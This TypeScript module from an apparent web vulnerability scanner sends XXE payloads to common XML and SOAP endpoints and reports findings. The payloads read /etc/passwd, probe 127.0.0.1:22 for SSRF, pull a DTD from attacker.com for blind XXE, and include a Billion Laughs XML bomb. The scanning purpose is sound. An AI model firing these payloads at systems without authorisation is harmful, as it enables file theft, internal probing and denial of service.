/**
 * Advanced XXE (XML External Entity) Injection Detection Module
 * 
 * Checks for:
 * - XXE via XML parsing endpoints
 * - Billion Laughs (XML bomb) DoS
 * - SSRF via XXE
 * - File disclosure via XXE
 * - DTD injection
 * - SOAP API XXE vulnerabilities
 */

import axios from 'axios';
import type { ScanConfiguration } from '../config/scanner-config';

interface Finding {
  module: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  title: string;
  description: string;
  remediation?: string;
  metadata?: {
    endpoint?: string;
    payload?: string;
    technique?: string;
    [key: string]: unknown;
  };
}

const XXE_ENDPOINTS = [
  '/api/xml',
  '/api/soap',
  '/api/import',
  '/api/upload',
  '/api/parse',
  '/api/rss',
  '/api/feed',
  '/api/document',
  '/soap',
  '/xml',
  '/import',
  '/feed',
];

// Basic XXE payload to test for entity expansion
const XXE_BASIC_PAYLOAD = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <test>&xxe;</test>
</data>`;

// XXE payload for SSRF detection
const XXE_SSRF_PAYLOAD = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<data>
  <test>&xxe;</test>
</data>`;

// Billion Laughs attack (XML bomb)
const XXE_BILLION_LAUGHS = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>`;

// XXE with parameter entities (blind XXE)
const XXE_PARAMETER_ENTITY = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<data>test</data>`;

// SOAP-specific XXE
const SOAP_XXE_PAYLOAD = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>`;

export async function runAdvancedXxe(
  hostname: string,
  config: ScanConfiguration
): Promise<Finding[]> {
  console.log(`[xxe] Running against ${hostname}`);
  const findings: Finding[] = [];
  const protocol = 'https://';
  const baseUrl = `${protocol}${hostname}`;

  try {
    // 1. Test XML endpoints for XXE
    const xxeFindings = await testXxeInjection(baseUrl, config);
    findings.push(...xxeFindings);

    // 2. Test SOAP endpoints
    const soapFindings = await testSoapXxe(baseUrl, config);
    findings.push(...soapFindings);

    // 3. Test for XML bomb (DoS)
    const dosFindings = await testXmlBomb(baseUrl, config);
    findings.push(...dosFindings);

    console.log(`[xxe] Completed with ${findings.length} findings`);
  } catch (error) {
    console.error('[xxe] Error:', error);
  }

  return findings;
}

async function testXxeInjection(
  baseUrl: string,
  config: ScanConfiguration
): Promise<Finding[]> {
  const findings: Finding[] = [];
  const endpointsToTest = config.userPlan === 'enterprise' || config.userPlan === 'red_team'
    ? XXE_ENDPOINTS
    : XXE_ENDPOINTS.slice(0, 6);

  for (const endpoint of endpointsToTest) {
    // First check if endpoint exists and accepts XML
    let acceptsXml = false;
    try {
      const checkResponse = await axios.post(`${baseUrl}${endpoint}`, '<test/>', {
        headers: { 'Content-Type': 'application/xml' },
        validateStatus: () => true,
        timeout: 5000,
      });
      // Only test if endpoint exists (not 404) and doesn't just redirect
      acceptsXml = checkResponse.status !== 404 && checkResponse.status !== 302 && checkResponse.status !== 307;
    } catch {
      continue; // Skip if endpoint doesn't exist
    }

    if (!acceptsXml) continue;

    // Test basic XXE (file disclosure)
    try {
      const response = await axios.post(`${baseUrl}${endpoint}`, XXE_BASIC_PAYLOAD, {
        headers: {
          'Content-Type': 'application/xml',
        },
        validateStatus: () => true,
        timeout: 10000,
      });

      const responseData = typeof response.data === 'string' 
        ? response.data 
        : JSON.stringify(response.data);

      // Check for /etc/passwd content or other indicators of XXE
      if (/root:.*:0:0:|\/bin\/bash|\/etc\/passwd/i.test(responseData)) {
        findings.push({
          module: 'xxe',
          severity: 'critical',
          title: `XXE File Disclosure at ${endpoint}`,
          description: `CRITICAL: The endpoint ${endpoint} is vulnerable to XML External Entity (XXE) injection. The server successfully parsed external entities and disclosed the contents of /etc/passwd. Attackers can read arbitrary files from the server, including configuration files with credentials.`,
          remediation: `URGENT: Disable XML external entity processing in your XML parser. For libxml2: LIBXML_NOENT and LIBXML_DTDLOAD = false. For Java: XMLInputFactory.setProperty(SUPPORT_DTD, false). Use JSON instead of XML when possible.`,
          metadata: {
            endpoint,
            technique: 'file-disclosure',
            payload: 'file:///etc/passwd',
          },
        });
        continue; // Found vulnerability, move to next endpoint
      }

      // Even if file content not visible, check if entity was processed
      if (response.status === 200 && responseData.length > 50) {
        // Entity might have been expanded but content not returned
        findings.push({
          module: 'xxe',
          severity: 'high',
          title: `Potential XXE at ${endpoint}`,
          description: `The endpoint ${endpoint} accepts XML input with DOCTYPE declarations. While file content was not visible in the response, the server may still be processing external entities, making it vulnerable to blind XXE attacks.`,
          remediation: `Disable DOCTYPE declarations and external entity processing. Configure XML parser to reject DTDs entirely.`,
          metadata: {
            endpoint,
            technique: 'possible-xxe',
          },
        });
      }
    } catch (error) {
      // Endpoint doesn't exist or parser rejected XXE (good!)
    }

    // Test SSRF via XXE
    try {
      const response = await axios.post(`${baseUrl}${endpoint}`, XXE_SSRF_PAYLOAD, {
        headers: {
          'Content-Type': 'application/xml',
        },
        validateStatus: () => true,
        timeout: 15000, // Longer timeout for network requests
      });

      const responseData = typeof response.data === 'string' 
        ? response.data 
        : JSON.stringify(response.data);

      // Check for SSRF indicators (SSH banner, connection errors, etc.)
      if (/SSH|OpenSSH|connection|protocol|timeout/i.test(responseData)) {
        findings.push({
          module: 'xxe',
          severity: 'critical',
          title: `XXE-based SSRF at ${endpoint}`,
          description: `The endpoint ${endpoint} is vulnerable to SSRF via XXE. The server attempted to connect to internal services (127.0.0.1:22), which can be exploited to scan internal networks, access cloud metadata endpoints, or bypass firewalls.`,
          remediation: `Disable external entity processing. Block network access from XML parser. Implement network-level restrictions on outbound connections from application servers.`,
          metadata: {
            endpoint,
            technique: 'ssrf-via-xxe',
            payload: 'http://127.0.0.1:22',
          },
        });
      }
    } catch (error) {
      // Expected if parser is secure
    }

    // Test parameter entity injection (blind XXE)
    try {
      const response = await axios.post(`${baseUrl}${endpoint}`, XXE_PARAMETER_ENTITY, {
        headers: {
          'Content-Type': 'application/xml',
        },
        validateStatus: () => true,
        timeout: 15000,
      });

      // If server attempts to fetch external DTD, it's vulnerable to blind XXE
      // In real testing, you'd use a server you control to detect the callback
      if (response.status >= 200 && response.status < 500) {
        findings.push({
          module: 'xxe',
          severity: 'medium',
          title: `Potential Blind XXE at ${endpoint}`,
          description: `The endpoint ${endpoint} may be vulnerable to blind XXE via parameter entities. The server accepts DTD declarations that could be used to exfiltrate data via out-of-band channels.`,
          remediation: `Disable all external entity processing, including parameter entities. Reject XML documents with DTD declarations.`,
          metadata: {
            endpoint,
            technique: 'blind-xxe',
          },
        });
      }
    } catch (error) {
      // Expected
    }
  }

  return findings;
}

async function testSoapXxe(
  baseUrl: string,
  config: ScanConfiguration
): Promise<Finding[]> {
  const findings: Finding[] = [];
  const soapEndpoints = ['/soap', '/api/soap', '/ws', '/webservice'];

  for (const endpoint of soapEndpoints) {
    try {
      const response = await axios.post(`${baseUrl}${endpoint}`, SOAP_XXE_PAYLOAD, {
        headers: {
          'Content-Type': 'text/xml',
          'SOAPAction': 'test',
        },
        validateStatus: () => true,
        timeout: 10000,
      });

      const responseData = typeof response.data === 'string' 
        ? response.data 
        : JSON.stringify(response.data);

      // Check for XXE in SOAP response
      if (/root:.*:0:0:|\/bin\/bash|\/etc\/passwd/i.test(responseData)) {
        findings.push({
          module: 'xxe',
          severity: 'critical',
          title: `XXE in SOAP Endpoint: ${endpoint}`,
          description: `The SOAP endpoint ${endpoint} is vulnerable to XXE attacks. Successfully disclosed /etc/passwd contents via external entity injection in SOAP envelope.`,
          remediation: `Disable DTD processing in SOAP parser. Update to secure XML parsing libraries. Consider migrating to REST APIs instead of SOAP.`,
          metadata: {
            endpoint,
            technique: 'soap-xxe',
          },
        });
      }
    } catch (error) {
      // SOAP endpoint doesn't exist
    }
  }

  return findings;
}

async function testXmlBomb(
  baseUrl: string,
  config: ScanConfiguration
): Promise<Finding[]> {
  const findings: Finding[] = [];
  const testEndpoint = '/api/xml';

  try {
    const startTime = Date.now();
    
    const response = await axios.post(`${baseUrl}${testEndpoint}`, XXE_BILLION_LAUGHS, {
      headers: {
        'Content-Type': 'application/xml',
      },
      validateStatus: () => true,
      timeout: 30000, // Long timeout to detect processing delay
    });

    const duration = Date.now() - startTime;

    // If server takes long time or crashes, it's vulnerable to XML bombs
    if (duration > 10000 || response.status === 500 || response.status === 503) {
      findings.push({
        module: 'xxe',
        severity: 'high',
        title: 'XML Bomb / Billion Laughs DoS',
        description: `The endpoint ${testEndpoint} is vulnerable to XML entity expansion attacks (Billion Laughs). The server spent ${duration}ms processing the malicious XML, indicating it expands entities without limits. This can cause Denial of Service by exhausting CPU/memory.`,
        remediation: `Set entity expansion limits in XML parser. Disable external entities. Implement request size limits and timeout enforcement. Use streaming parsers instead of DOM parsers for large documents.`,
        metadata: {
          endpoint: testEndpoint,
          technique: 'xml-bomb',
          processingTime: `${duration}ms`,
        },
      });
    }
  } catch (error: unknown) {
    // Check if timeout occurred (indicates DoS success)
    if (error && typeof error === 'object' && 'code' in error && error.code === 'ECONNABORTED') {
      findings.push({
        module: 'xxe',
        severity: 'high',
        title: 'XML Bomb Causes Timeout',
        description: `The endpoint ${testEndpoint} timed out while processing a Billion Laughs attack, confirming vulnerability to XML entity expansion DoS.`,
        remediation: `Configure XML parser with strict entity expansion limits and timeouts.`,
        metadata: {
          endpoint: testEndpoint,
          technique: 'xml-bomb',
        },
      });
    }
  }

  return findings;
}
